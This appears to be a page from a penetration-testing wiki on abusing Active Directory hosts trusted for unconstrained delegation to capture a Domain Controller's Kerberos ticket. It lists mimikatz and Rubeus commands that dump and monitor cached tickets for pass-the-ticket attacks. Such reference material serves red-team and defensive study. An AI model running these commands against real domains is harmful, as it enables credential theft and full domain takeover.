# Unconstrained Delegation

A host trusted for unconstrained delegation caches the forwardable TGT of everyone who authenticates to it. Compromise that host, coerce a Domain Controller to authenticate to it, and you capture a DC's TGT.

## Why It Works

Unconstrained delegation stores the user's actual TGT in memory so the service can reuse it anywhere. There is no restriction on which onward service the ticket is used for — hence 'unconstrained'.

## Prerequisites

* Control of a host configured for unconstrained delegation
* A way to coerce a high-value account to authenticate to it

## Execution

**Unconstrained delegation**

* UAC: ADS\_UF\_TRUSTED\_FOR\_DELEGATION
  * Force connection with coerce
    * Get tickets
      * `mimikatz privilege::debug sekurlsa::tickets /export sekurlsa::tickets /export` [\[tool\]](https://github.com/gentilkiwi/mimikatz)
      * `Rubeus.exe dump /service:krbtgt /nowrap` [\[tool\]](https://github.com/GhostPack/Rubeus)
      * `Rubeus.exe dump /luid:0xdeadbeef /nowrap` [\[tool\]](https://github.com/GhostPack/Rubeus)
        * **→ Kerberos TGT**
          * **→ PassTheTicket**
      * `Rubeus.exe monitor /interval:5` [\[tool\]](https://github.com/GhostPack/Rubeus)

## Related

* [Authentication Coercion](file:///9685693/coercion-relay/authentication-coercion.md) — triggering the DC to authenticate
* [Constrained Delegation](file:///9685693/delegation/constrained-delegation.md) — the scoped variant
